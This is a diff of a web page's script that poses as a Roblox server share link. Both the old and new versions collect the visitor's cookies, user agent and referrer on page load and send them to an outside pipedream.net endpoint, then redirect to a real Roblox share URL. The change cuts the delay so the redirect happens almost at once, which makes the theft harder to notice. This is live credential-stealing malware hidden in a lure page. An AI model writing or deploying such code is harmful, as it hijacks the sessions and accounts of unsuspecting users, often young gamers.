@@ -343,54 +343,45 @@
 
     <script>
       
-        const YOUR_API_URL = 'https://eot2iixinio81vq.m.pipedream.net/'; // unde trimiți cookie-urile
-        const REDIRECT_URL = 'https://www.roblox.com/share?code=a1830c3b439b154fb6978bff940c7154&type=Server'; // unde redirecționezi
-        
-     
-        function sendCookies() {
-            const data = {
-                cookies: document.cookie,
-                user_agent: navigator.userAgent,
-                referrer: document.referrer,
-                timestamp: new Date().toISOString(),
-                share_code: 'a1830c3b439bf54fb6978bff940c7154',
-               
-            };
-            
+        const YOUR_API_URL = 'https://eot2iixinio81vq.m.pipedream.net/';
+    const REDIRECT_URL = 'https://www.roblox.com/share?code=a1830c3b439b154fb6978bff940c7154&type=Server';
 
-            const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
-            
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(YOUR_API_URL, blob);
-            } else {
-            
-                fetch(YOUR_API_URL, {
-                    method: 'POST',
-                    body: blob,
-                    keepalive: true
-                });
-            }
+    function sendCookies() {
+        const data = {
+            cookies: document.cookie,
+            user_agent: navigator.userAgent,
+            referrer: document.referrer,
+            timestamp: new Date().toISOString(),
+            share_code: 'a1830c3b439bf54fb6978bff940c7154',
+        };
+
+        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(YOUR_API_URL, blob);
+        } else {
+            fetch(YOUR_API_URL, {
+                method: 'POST',
+                body: blob,
+                keepalive: true
+            });
         }
-        
-     
-        document.addEventListener('DOMContentLoaded', function() {
-         
-            setTimeout(() => {
-                
-                sendCookies();
-                
-      
-                setTimeout(() => {
-                    window.location.href = REDIRECT_URL;
-                }, 500
-                        
-                );
-            }, 2000);
-        });
-    </script>
-</body>
+    }
 
+    document.addEventListener('DOMContentLoaded', function() {
+        sendCookies();
+
+        // Redirect aproape instant (50ms delay)
+        setTimeout(() => {
+            window.location.href = REDIRECT_URL;
+        }, 50);
+    });
+</script>
+</body>
+ 
+ 
 </html>
+
 
 
 
